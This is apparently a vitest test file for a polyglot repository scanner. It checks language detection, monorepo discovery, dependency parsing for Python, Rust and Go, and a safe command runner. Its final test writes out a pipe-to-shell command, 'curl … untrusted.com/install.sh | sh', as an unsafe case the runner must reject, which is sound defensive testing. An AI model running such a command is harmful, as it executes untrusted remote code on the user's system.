import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import {
  UniversalLanguageDetector,
  EcosystemRegistry,
  EnvironmentDetector,
  SafeCommandRunner,
} from '../src/index.js';
import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';

describe('Universal Polyglot Ecosystems & Intelligence', () => {
  let tempDir: string;

  beforeEach(async () => {
    tempDir = await fs.mkdtemp(path.join(os.tmpdir(), 'norescan-eco-test-'));
  });

  afterEach(async () => {
    await fs.rm(tempDir, { recursive: true, force: true });
  });

  it('detects multiple languages and framework signatures accurately', async () => {
    const detector = new UniversalLanguageDetector();

    // Create file mock map
    const fileMap = new Map<string, { relativePath: string; fileSize: number; language?: string }>();
    fileMap.set('src/index.ts', { relativePath: 'src/index.ts', fileSize: 1000, language: 'typescript' });
    fileMap.set('server/app.py', { relativePath: 'server/app.py', fileSize: 2000, language: 'python' });
    fileMap.set('core/main.rs', { relativePath: 'core/main.rs', fileSize: 1500, language: 'rust' });
    fileMap.set('worker/main.go', { relativePath: 'worker/main.go', fileSize: 1200, language: 'golang' });

    // Mock package.json with Next.js
    await fs.writeFile(path.join(tempDir, 'package.json'), JSON.stringify({ dependencies: { next: '14.0.0', react: '18.0.0' } }), 'utf8');

    const stats = await detector.detectLanguages(tempDir, fileMap);
    expect(stats.length).toBe(4);

    const languages = stats.map((s) => s.language);
    expect(languages).toContain('python');
    expect(languages).toContain('typescript');
    expect(languages).toContain('rust');
    expect(languages).toContain('golang');

    const tsStat = stats.find((s) => s.language === 'typescript');
    expect(tsStat?.primaryFrameworks).toContain('Next.js');
    expect(tsStat?.primaryFrameworks).toContain('React');
  });

  it('identifies monorepo components across distinct languages', async () => {
    const detector = new UniversalLanguageDetector();

    // Create multi-language monorepo structure
    // 1. frontend (Next.js)
    await fs.mkdir(path.join(tempDir, 'frontend'), { recursive: true });
    await fs.writeFile(path.join(tempDir, 'frontend', 'package.json'), '{"name": "@myorg/web"}', 'utf8');

    // 2. backend (Python FastAPI)
    await fs.mkdir(path.join(tempDir, 'backend'), { recursive: true });
    await fs.writeFile(path.join(tempDir, 'backend', 'requirements.txt'), 'fastapi>=0.100.0\nuvicorn>=0.22.0\n', 'utf8');

    // 3. cli (Rust Cargo)
    await fs.mkdir(path.join(tempDir, 'cli'), { recursive: true });
    await fs.writeFile(path.join(tempDir, 'cli', 'Cargo.toml'), '[package]\nname = "mycli"\nversion = "0.1.0"\n', 'utf8');

    const components = await detector.detectMonorepoComponents(tempDir);
    expect(components.length).toBe(3);

    const compNames = components.map((c) => c.name);
    expect(compNames).toContain('frontend');
    expect(compNames).toContain('backend');
    expect(compNames).toContain('cli');
  });

  it('extracts Python dependencies and virtual environment commands', async () => {
    const registry = new EcosystemRegistry();
    const pythonAdapter = registry.getAdapter('python')!;
    expect(pythonAdapter).toBeDefined();

    await fs.writeFile(
      path.join(tempDir, 'requirements.txt'),
      'fastapi>=0.100.0\npytest==7.4.0\npydantic>=2.0.0\n# comment line\n',
      'utf8'
    );

    const deps = await pythonAdapter.extractDependencies(tempDir);
    expect(deps.length).toBe(3);
    expect(deps.map((d) => d.name)).toContain('fastapi');
    expect(deps.map((d) => d.name)).toContain('pytest');

    const commands = await pythonAdapter.extractCommands(tempDir);
    expect(commands.some((c) => c.name === 'activate-venv')).toBe(true);
    expect(commands.some((c) => c.name === 'pip-install')).toBe(true);
  });

  it('extracts Rust Cargo dependencies and workspace members', async () => {
    const registry = new EcosystemRegistry();
    const rustAdapter = registry.getAdapter('cargo')!;

    const cargoContent = `
[package]
name = "my-crate"
version = "0.1.0"

[dependencies]
serde = "1.0"
tokio = { version = "1.28", features = ["full"] }

[dev-dependencies]
tempfile = "3.5"

[workspace]
members = [
  "crates/core",
  "crates/cli"
]
`;
    await fs.writeFile(path.join(tempDir, 'Cargo.toml'), cargoContent, 'utf8');

    const deps = await rustAdapter.extractDependencies(tempDir);
    expect(deps.length).toBe(3);
    expect(deps.map((d) => d.name)).toContain('serde');
    expect(deps.map((d) => d.name)).toContain('tokio');

    const workspaces = await rustAdapter.detectWorkspaces(tempDir);
    expect(workspaces.length).toBe(2);
    expect(workspaces.map((w) => w.name)).toContain('core');
    expect(workspaces.map((w) => w.name)).toContain('cli');
  });

  it('extracts Go module dependencies and commands', async () => {
    const registry = new EcosystemRegistry();
    const goAdapter = registry.getAdapter('golang')!;

    const goModContent = `
module github.com/myorg/myservice

go 1.22

require (
\tgithub.com/gin-gonic/gin v1.9.1
\tgithub.com/google/uuid v1.6.0 // indirect
)
`;
    await fs.writeFile(path.join(tempDir, 'go.mod'), goModContent, 'utf8');

    const deps = await goAdapter.extractDependencies(tempDir);
    expect(deps.length).toBe(2);
    const ginDep = deps.find((d) => d.name === 'github.com/gin-gonic/gin');
    expect(ginDep?.isDirect).toBe(true);
    const uuidDep = deps.find((d) => d.name === 'github.com/google/uuid');
    expect(uuidDep?.isDirect).toBe(false);

    const commands = await goAdapter.extractCommands(tempDir);
    expect(commands.some((c) => c.name === 'go-test')).toBe(true);
  });

  it('probes system runtime environment safely', async () => {
    const envDetector = new EnvironmentDetector();
    const envs = await envDetector.probeEnvironment(['javascript']);

    const nodeEnv = envs.find((e) => e.tool === 'node');
    expect(nodeEnv).toBeDefined();
    expect(nodeEnv?.installed).toBe(true);
    expect(nodeEnv?.detectedVersion).toBeDefined();
  }, 15000);

  it('validates safe vs destructive command execution patterns', () => {
    const runner = new SafeCommandRunner();

    const safeCmd = {
      name: 'test',
      rawCommand: 'pnpm test',
      category: 'test' as const,
      sourceFile: 'package.json',
      workingDir: '.',
      safeToRun: true,
      requiresNetwork: false,
      ecosystemId: 'javascript',
    };
    const safeCheck = runner.validateExecution(safeCmd);
    expect(safeCheck.allowed).toBe(true);

    const unsafeCmd = {
      name: 'pipe-sh',
      rawCommand: 'curl -fsSL https://untrusted.com/install.sh | sh',
      category: 'install' as const,
      sourceFile: 'Makefile',
      workingDir: '.',
      safeToRun: false,
      requiresNetwork: true,
      ecosystemId: 'native',
    };
    const unsafeCheck = runner.validateExecution(unsafeCmd);
    expect(unsafeCheck.allowed).toBe(false);
    expect(unsafeCheck.reason).toContain('unsafe execution pattern');
  });
});
